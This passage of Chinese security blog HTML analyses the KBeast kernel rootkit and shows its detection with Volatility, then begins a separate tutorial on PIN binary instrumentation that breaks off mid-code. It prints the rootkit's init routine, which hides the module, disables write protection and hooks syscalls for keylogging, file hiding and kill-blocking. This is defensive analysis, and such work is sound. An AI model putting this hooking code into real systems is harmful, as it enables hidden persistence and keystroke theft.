+<p>成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/<em>h4x</em>路径下，生成/usr/<em>h4x</em>/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。</p>
+<h3 id="0X05-Kbeast-核心"><a href="#0X05-Kbeast-核心" class="headerlink" title="0X05 Kbeast 核心"></a>0X05 Kbeast 核心</h3><p>Kbeast以LKM的方式存在，以下是其核心代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*init module insmod*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">//Uncomment to hide this module</span></div><div class="line">  list_del_init(&amp;__this_module.<span class="built_in">list</span>);</div><div class="line"></div><div class="line">  <span class="keyword">struct</span> tcp_seq_afinfo *my_afinfo = <span class="literal">NULL</span>;</div><div class="line">  <span class="comment">//proc_net is disappeared in 2.6.32, use init_net.proc_net</span></div><div class="line">  <span class="keyword">struct</span> proc_dir_entry *my_dir_entry = init_net.proc_net-&gt;subdir;  </div><div class="line"></div><div class="line">  write_cr0 (read_cr0 () &amp; (~ <span class="number">0x10000</span>));</div><div class="line">  <span class="keyword">if</span>(_KEYLOG_)&#123;</div><div class="line">    o_read=(<span class="keyword">void</span> *)sys_call_table[__NR_read];</div><div class="line">    sys_call_table[__NR_read]=h4x_read;</div><div class="line">  &#125;</div><div class="line">  o_write=(<span class="keyword">void</span> *)sys_call_table[__NR_write];</div><div class="line">  sys_call_table[__NR_write]=h4x_write;</div><div class="line">  <span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__)</span></div><div class="line">    o_getdents=sys_call_table [__NR_getdents];</div><div class="line">    sys_call_table [__NR_getdents]=h4x_getdents;</div><div class="line">  <span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)</span></div><div class="line">    o_getdents64=sys_call_table [__NR_getdents64];</div><div class="line">    sys_call_table [__NR_getdents64]=h4x_getdents64;</div><div class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">    <span class="meta">#<span class="meta-keyword">error</span> Unsupported architecture</span></div><div class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  o_unlink = sys_call_table [__NR_unlink];</div><div class="line">  sys_call_table [__NR_unlink] = h4x_unlink;</div><div class="line">  o_rmdir = sys_call_table [__NR_rmdir];</div><div class="line">  sys_call_table [__NR_rmdir] = h4x_rmdir;</div><div class="line">  o_unlinkat = sys_call_table [__NR_unlinkat];</div><div class="line">  sys_call_table [__NR_unlinkat] = h4x_unlinkat;</div><div class="line">  o_rename = sys_call_table [__NR_rename];</div><div class="line">  sys_call_table [__NR_rename] = h4x_rename;</div><div class="line">  o_open = sys_call_table [__NR_open];</div><div class="line">  sys_call_table [__NR_open] = h4x_open;</div><div class="line">  o_kill = sys_call_table [__NR_kill];</div><div class="line">  sys_call_table [__NR_kill] = h4x_kill;</div><div class="line">  o_delete_module = sys_call_table [__NR_delete_module];</div><div class="line">  sys_call_table [__NR_delete_module] = h4x_delete_module;</div><div class="line">  write_cr0 (read_cr0 () | <span class="number">0x10000</span>);</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="built_in">strcmp</span>(my_dir_entry-&gt;name, <span class="string">"tcp"</span>))</div><div class="line">    my_dir_entry = my_dir_entry-&gt;next;</div><div class="line">  <span class="keyword">if</span>((my_afinfo = (<span class="keyword">struct</span> tcp_seq_afinfo*)my_dir_entry-&gt;data))</div><div class="line">  &#123;</div><div class="line">    <span class="comment">//seq_show is disappeared in 2.6.32, use seq_ops.show</span></div><div class="line">    old_tcp4_seq_show = my_afinfo-&gt;seq_ops.show;</div><div class="line">    my_afinfo-&gt;seq_ops.show = h4x_tcp4_seq_show;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sys_call_table[__NR_read]=h4x_read; <span class="comment">// log key</span></div><div class="line">sys_call_table[__NR_write]=h4x_write; <span class="comment">// fake output ps,pstree,top,lsof</span></div><div class="line">sys_call_table [__NR_getdents]=h4x_getdents; <span class="comment">//hide file and directory</span></div><div class="line">sys_call_table [__NR_unlink] = h4x_unlink; <span class="comment">//Don't allow your file to be removed</span></div><div class="line">sys_call_table [__NR_rmdir] = h4x_rmdir; <span class="comment">//Don't allow your directory to be removed</span></div><div class="line">sys_call_table [__NR_unlinkat] = h4x_unlinkat; <span class="comment">//Don't allow your file and directory to be removed </span></div><div class="line">sys_call_table [__NR_rename] = h4x_rename; <span class="comment">//Don't allow your file to be renamed/moved</span></div><div class="line">sys_call_table [__NR_open] = h4x_open; <span class="comment">//Don't allow your file to be overwrited</span></div><div class="line">sys_call_table [__NR_kill] = h4x_kill; <span class="comment">//Don't allow your process to be killed</span></div><div class="line">sys_call_table [__NR_delete_module] = h4x_delete_module;</div></pre></td></tr></table></figure>
+<h3 id="0X06-Libvmi-and-Volatility检测KBeast"><a href="#0X06-Libvmi-and-Volatility检测KBeast" class="headerlink" title="0X06 Libvmi and Volatility检测KBeast"></a>0X06 Libvmi and Volatility检测KBeast</h3><p>检测之前，先按照 <a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">这篇</a> 文章搭好环境。</p>
+<p>以下是分别利用volatility的linux_psaux、linux_pslist、linux_pstree、linux_lsof、linux_proc_maps、linux_check_modules插件检测出来的结果，能检测出其隐藏的进程、模块、进程间的关系以及所在路径。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_psaux | grep _h4x_bd</div><div class="line">  </div><div class="line">Pid    Uid    Gid    Arguments </div><div class="line"><span class="number">2316</span>   <span class="number">2</span>      <span class="number">2</span>      ./_h4x_bd</div><div class="line"></div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslist | grep _h4x_bd </div><div class="line"> </div><div class="line"> Offset     Name                 Pid             Uid             Gid    DTB      Start Time</div><div class="line"> <span class="number">0xf579e680</span> _h4x_bd              <span class="number">2316</span>            <span class="number">2</span>               <span class="number">2</span>      <span class="number">0x357c5000</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-01</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">29</span> UTC+<span class="number">0000</span></div><div class="line">  </div><div class="line">  </div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32         --profile=Linuxubuntu1004desktopx86 linux_pstree | grep _h4x_bd </div><div class="line"></div><div class="line"> Name                 Pid             Uid </div><div class="line"> ._h4x_bd             <span class="number">2316</span>            <span class="number">2</span> </div><div class="line">  </div><div class="line"> python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_pslsof | grep _h4x_bd </div><div class="line">  </div><div class="line">  Offset             Name                           Pid      FD       Path</div><div class="line">  <span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">1</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">2</span> /dev/pts/<span class="number">0</span></div><div class="line"><span class="number">0x00000000f579e680</span> _h4x_bd                            <span class="number">2316</span>        <span class="number">3</span> socket:[<span class="number">11708</span>]</div><div class="line"></div><div class="line">python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_proc_maps | grep _h4x_bd </div><div class="line">  </div><div class="line">  </div><div class="line"> linux_proc_maps</div><div class="line"> </div><div class="line"> </div><div class="line"> Offset             Pid      Name                 Start              End         </div><div class="line">       Flags       Pgoff Major  Minor  Inode      File Path</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line"> </div><div class="line"> <span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd                  <span class="number">0x0000000000adb000</span> <span class="number">0x0000000000adc000</span> ---      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adc000</span> <span class="number">0x0000000000ade000</span> r--      <span class="number">0x153000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000ade000</span> <span class="number">0x0000000000adf000</span> rw-      <span class="number">0x155000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">134375</span> /lib/tls/i686/cmov/libc<span class="number">-2.11</span><span class="number">.1</span>.so</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000000adf000</span> <span class="number">0x0000000000ae2000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008048000</span> <span class="number">0x0000000008049000</span> r-x           <span class="number">0x0</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x0000000008049000</span> <span class="number">0x000000000804a000</span> r--        <span class="number">0x1000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x000000000804a000</span> <span class="number">0x000000000804b000</span> rw-        <span class="number">0x2000</span>    <span class="number">251</span>      <span class="number">1</span>     <span class="number">136169</span> /usr/_h4x_/_h4x_bd</div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7875000</span> <span class="number">0x00000000b7876000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000b7884000</span> <span class="number">0x00000000b7886000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> </div><div class="line"><span class="number">0x00000000f579e680</span>     <span class="number">2316</span> _h4x_bd              <span class="number">0x00000000bfd84000</span> <span class="number">0x00000000bfd99000</span> rw-           <span class="number">0x0</span>      <span class="number">0</span>      <span class="number">0</span>          <span class="number">0</span> [stack]</div><div class="line"></div><div class="line">  python vol.py -l vmi://<span class="number">1004</span>desktop32 --profile=Linuxubuntu1004desktopx86 linux_check_moudles | grep _h4x_bd   </div><div class="line">   </div><div class="line"> Module Address Module Name             </div><div class="line"> <span class="number">0xf805dae0</span> ipsecs_kbeast_v1</div></pre></td></tr></table></figure>
+<p> 当要清除module时，执行./setup clean. 但仍然会残留一些文件，无法删除。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Checking <span class="keyword">for</span> make : /usr/bin/make</div><div class="line">Removing Kernel Module</div><div class="line">Removing Compiled Kernel Module</div><div class="line">Stoping Network Daemon</div><div class="line">Removing Backdoor File</div><div class="line">rm: cannot remove `./_h4x_bd': Permission denied</div><div class="line">Removing Installation Directory</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.o.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.o':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/.ipsecs-kbeast-v1.ko.cmd':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.ko':         Permission denied</div><div class="line">rm: cannot remove                     `/usr/_h4x_/.tmp_versions/ipsecs-kbeast-v1.mod': Permission     denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.c':         Permission denied</div><div class="line">rm: cannot remove         `/usr/_h4x_/.ipsecs-kbeast-v1.mod.o.cmd': Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.c':         Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/bd-ipsecs-kbeast-v1.c':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.mod.o':     Permission denied</div><div class="line">rm: cannot remove `/usr/_h4x_/ipsecs-kbeast-v1.cc1':     Permission denied</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html" target="_blank" rel="external">http://volatility-labs.blogspot.com/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html</a></p>
+<p><a href="http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf" target="_blank" rel="external">http://cradpdf.drdc-rddc.gc.ca/PDFS/unc199/p801869_A1b.pdf</a></p>
+<p><a href="https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" target="_blank" rel="external">https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a> </p>
+<p><a href="http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/" target="_blank" rel="external">http://dddotcom.github.io/2015/01/10/Kbeast-Source-Code-Analysis/</a></p>
+<p><a href="http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">http://beneathclevel.blogspot.com/2013/06/a-linux-rootkit-tutorial-introduction.html</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码<span class="article-category-count">14</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-pinintro"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170104/pinintro/">二进制代码注入PIN</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/pinintro/" class="article-date">
+	  <time datetime="2017-01-04T06:16:14.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2015/12/19/pin-for-dynamic-binary-instrumentation/" target="_blank" rel="external">个人博客</a>，讲述如何利用PIN进行二进制代码注入，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<hr>
+<blockquote>
+<ul>
+<li>什么是注入（Instrumentation)</li>
+<li>PIN初探</li>
+<li>PIN框架</li>
+<li>Pintools Example</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="什么是注入（Instrumentation"><a href="#什么是注入（Instrumentation" class="headerlink" title="什么是注入（Instrumentation)"></a>什么是注入（Instrumentation)</h2><p>每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。</p>
+<p>进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：</p>
+<ul>
+<li>不需要重新编译、重新链接</li>
+<li>在运行时发现代码</li>
+<li>能处理动态产生的代码</li>
+<li>能附加到正在运行时的进程中</li>
+</ul>
+<p>目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。</p>
+<h2 id="Pin初探"><a href="#Pin初探" class="headerlink" title="Pin初探"></a>Pin初探</h2><p>对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.</p>
+<p>开门见山，首先来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    counter++;</div><div class="line">             sub  $0xff, %edx</div><div class="line">    counter++;</div><div class="line">             cmp  %esi, %edx</div><div class="line">    counter++;</div><div class="line">             jle &lt;L1&gt;</div><div class="line">    counter++;</div><div class="line">             mov  $0x1, %edi</div><div class="line">    counter++;</div><div class="line">             add  $0x10, %eax</div><div class="line">```             </div><div class="line"></div><div class="line">这段代码很简单，只是在每条指令前加了一个计数器</div><div class="line">那么如果使用PIN, 该如何实现？ 看下面代码：</div><div class="line"></div><div class="line">``` C</div><div class="line">#include &lt;iostream&gt;</div><div class="line">#include &quot;pin.h&quot;</div><div class="line"></div><div class="line">UINT64 icount = 0;</div><div class="line"></div><div class="line">void docount() &#123; icount++; &#125;</div><div class="line">    </div><div class="line">void Instruction(INS ins, void *v) </div><div class="line">&#123;</div><div class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Fini(INT32 code, void *v) </div><div class="line">&#123; std::cerr &lt;&lt; &quot;Count &quot; &lt;&lt; icount &lt;&lt; endl; &#125;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    PIN_Init(argc, argv);</div><div class="line">    INS_AddInstrumentFunction(Instruction, 0);</div><div class="line">    PIN_AddFiniFunction(Fini, 0);</div><div class="line">    PIN_StartProgram();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>现在对这段实现代码一一解释：<br><code>void docount() {icount+;}</code> 用户可自定义<code>docount()</code> 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，<code>IPOINT_BEFORE</code> 表示在每条指令之前执行，<code>（AFUNPTR)docount</code>便是要注入的分析例程。<code>main()</code> 函数调用<code>INS_AddInstrumentFunction（Instruction,0)</code>,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。<br>只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。</p>
+<p>##PIN框架<br>可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.<br>如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。</p>
+<p>下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。<br>总的来说，instrumentation包括两个部分：</p>
+<ul>
+<li>第一，决定在哪注入代码，注入什么代码的一种机制</li>
+<li>第二，在注入点要执行的代码</li>
+</ul>
+<p>第一个部分被称之为 <strong>instrumentation routine</strong>,第二个部分被称之为 <strong>analysis routine</strong>. Pintools会向PIN注册一个注入回调函数，如上文提到的<code>INS_AddInstrumentFunction（）</code>，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。</p>
+<p>注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：</p>
+<ul>
+<li>Instruction</li>
+<li>Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。</li>
+<li>Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 </li>
+</ul>
+<p>##Pintools example<br>最后，以一个Pintools 的完整例子结束本文</p>
+ <figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></div><div class="line"></div><div class="line">ofstream OutFile;</div><div class="line"></div><div class="line"><span class="comment">// The running count of instructions is kept here</span></div><div class="line"><span class="comment">// make it static to help the compiler optimize docount</span></div><div class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// This function is called before every instruction is      executed</span></div><div class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</div><div class="line"></div><div class="line"><span class="comment">// Pin calls this function every time a new instruction     is encountered</span></div><div class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Insert a call to docount before every            instruction, no arguments are passed</span></div><div class="line">  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class="line">&#125;</div><div class="line"></div><div class="line">KNOB&lt;<span class="built_in">string</span>&gt; KnobOutputFile(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</div><div class="line"><span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>);</div><div class="line"></div><div class="line"><span class="comment">// This function is called when the application exits</span></div><div class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed     by the application</span></div><div class="line">  OutFile.setf(ios::showbase);</div><div class="line">  OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  OutFile.close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Print Help Message                                                        */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic          instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">   <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt;      <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"><span class="comment">/* Main                                                                      */</span></div><div 